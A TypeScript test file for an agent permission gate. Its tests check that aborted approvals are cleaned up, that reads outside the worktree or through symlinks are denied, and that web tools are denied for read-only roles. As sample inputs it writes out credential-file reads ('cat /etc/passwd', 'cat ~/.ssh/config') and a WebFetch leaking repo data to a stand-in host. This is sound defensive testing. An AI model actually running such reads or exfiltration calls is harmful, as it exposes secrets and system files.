import { describe, expect, test } from "bun:test";
import type { AgentEvent } from "@openducktor/core";
import {
  createClaudeCanUseTool,
  createClaudePermissionTestSession as createSession,
} from "./claude-agent-sdk-permissions.test-support";

describe("Claude permission request lifecycle", () => {
  test("cleans up pending approvals when the Claude permission request is aborted", async () => {
    const events: AgentEvent[] = [];
    const session = createSession("build");
    const canUseTool = createClaudeCanUseTool({
      session,
      now: () => "2026-06-25T12:00:00.000Z",
      randomId: () => "request-1",
      emit: (_session, event) => events.push(event),
    });
    const abortController = new AbortController();

    const resultPromise = canUseTool(
      "Bash",
      { command: "cat /etc/passwd" },
      {
        signal: abortController.signal,
        toolUseID: "tool-use-1",
      },
    );

    expect(session.pendingApprovals.has("request-1")).toBe(true);
    abortController.abort();

    await expect(resultPromise).resolves.toEqual({
      behavior: "deny",
      message: "Claude permission request was aborted.",
      interrupt: true,
    });
    expect(session.pendingApprovals.has("request-1")).toBe(false);
    expect(events).toEqual([
      expect.objectContaining({
        type: "approval_required",
        requestId: "request-1",
      }),
    ]);
  });

  test("does not create pending approvals when the Claude permission signal is already aborted", async () => {
    const events: AgentEvent[] = [];
    const session = createSession("build");
    const canUseTool = createClaudeCanUseTool({
      session,
      now: () => "2026-06-25T12:00:00.000Z",
      randomId: () => "request-1",
      emit: (_session, event) => events.push(event),
    });
    const abortController = new AbortController();
    abortController.abort();

    const result = await canUseTool(
      "Bash",
      { command: "cat /etc/passwd" },
      {
        signal: abortController.signal,
        toolUseID: "tool-use-1",
      },
    );

    expect(result).toEqual({
      behavior: "deny",
      message: "Claude permission request was aborted.",
      interrupt: true,
    });
    expect(session.pendingApprovals.size).toBe(0);
    expect(events).toEqual([]);
  });

  test("denies read-only shell inspection outside the session worktree for read-only roles", async () => {
    const events: AgentEvent[] = [];
    const session = createSession("qa");
    const canUseTool = createClaudeCanUseTool({
      session,
      now: () => "2026-06-25T12:00:00.000Z",
      randomId: () => "request-1",
      emit: (_session, event) => events.push(event),
    });

    const result = await canUseTool(
      "Bash",
      { command: "cat ~/.ssh/config" },
      {
        signal: new AbortController().signal,
        toolUseID: "tool-use-1",
      },
    );

    expect(result).toEqual({
      behavior: "deny",
      decisionClassification: "user_reject",
      message: "Tool Bash is disabled for read-only OpenDucktor workflow roles.",
    });
    expect(events).toEqual([]);
    expect(session.pendingApprovals.size).toBe(0);
  });

  test("denies direct file reads outside the session worktree for read-only roles", async () => {
    const events: AgentEvent[] = [];
    const session = createSession("planner");
    const canUseTool = createClaudeCanUseTool({
      session,
      now: () => "2026-06-25T12:00:00.000Z",
      randomId: () => "request-1",
      emit: (_session, event) => events.push(event),
    });

    const result = await canUseTool(
      "Read",
      { file_path: "/etc/passwd" },
      {
        signal: new AbortController().signal,
        toolUseID: "tool-use-1",
      },
    );

    expect(result).toEqual({
      behavior: "deny",
      decisionClassification: "user_reject",
      message: "Tool Read attempted to read outside the session working directory: /etc/passwd",
    });
    expect(events).toEqual([]);
    expect(session.pendingApprovals.size).toBe(0);
  });

  test("denies reads whose canonical path escapes through a worktree symlink", async () => {
    const events: AgentEvent[] = [];
    const session = createSession("qa");
    const canUseTool = createClaudeCanUseTool({
      session,
      canonicalizePath: async (path) =>
        path === "/repo/link/secret.txt" ? "/outside/secret.txt" : path,
      now: () => "2026-06-25T12:00:00.000Z",
      randomId: () => "request-1",
      emit: (_session, event) => events.push(event),
    });

    const result = await canUseTool(
      "Read",
      { file_path: "/repo/link/secret.txt" },
      {
        signal: new AbortController().signal,
        toolUseID: "tool-use-1",
      },
    );

    expect(result).toEqual({
      behavior: "deny",
      decisionClassification: "user_reject",
      message:
        "Tool Read attempted to read outside the session working directory: /repo/link/secret.txt",
    });
    expect(events).toEqual([]);
  });

  test("delegates subagents to the configured approval flow in read-only roles", async () => {
    const events: AgentEvent[] = [];
    const session = createSession("spec");
    const canUseTool = createClaudeCanUseTool({
      session,
      now: () => "2026-06-25T12:00:00.000Z",
      randomId: () => "request-1",
      emit: (_session, event) => events.push(event),
    });

    const toolInput = { prompt: "Inspect the repo" };
    const resultPromise = canUseTool("Agent", toolInput, {
      signal: new AbortController().signal,
      toolUseID: "tool-use-1",
    });

    expect(events).toEqual([
      expect.objectContaining({
        type: "approval_required",
        requestId: "request-1",
        mutation: "unknown",
        tool: {
          name: "Agent",
          input: toolInput,
        },
      }),
    ]);
    expect(session.pendingApprovals.has("request-1")).toBe(true);
    session.pendingApprovals.get("request-1")?.resolve({ behavior: "allow" });
    await expect(resultPromise).resolves.toEqual({
      behavior: "allow",
      updatedInput: toolInput,
    });
  });

  test("denies network tools in read-only workflow roles before creating approval requests", async () => {
    const events: AgentEvent[] = [];
    const session = createSession("spec");
    const canUseTool = createClaudeCanUseTool({
      session,
      now: () => "2026-06-25T12:00:00.000Z",
      randomId: () => "request-1",
      emit: (_session, event) => events.push(event),
    });

    const fetchResult = await canUseTool(
      "WebFetch",
      { url: "https://example.invalid/?leak=repo-data" },
      {
        signal: new AbortController().signal,
        toolUseID: "tool-use-1",
      },
    );
    const searchResult = await canUseTool(
      "WebSearch",
      { query: "repo secret" },
      {
        signal: new AbortController().signal,
        toolUseID: "tool-use-2",
      },
    );

    expect(fetchResult).toEqual({
      behavior: "deny",
      decisionClassification: "user_reject",
      message: "Tool WebFetch is disabled for read-only OpenDucktor workflow roles.",
    });
    expect(searchResult).toEqual({
      behavior: "deny",
      decisionClassification: "user_reject",
      message: "Tool WebSearch is disabled for read-only OpenDucktor workflow roles.",
    });
    expect(events).toEqual([]);
    expect(session.pendingApprovals.size).toBe(0);
  });
});
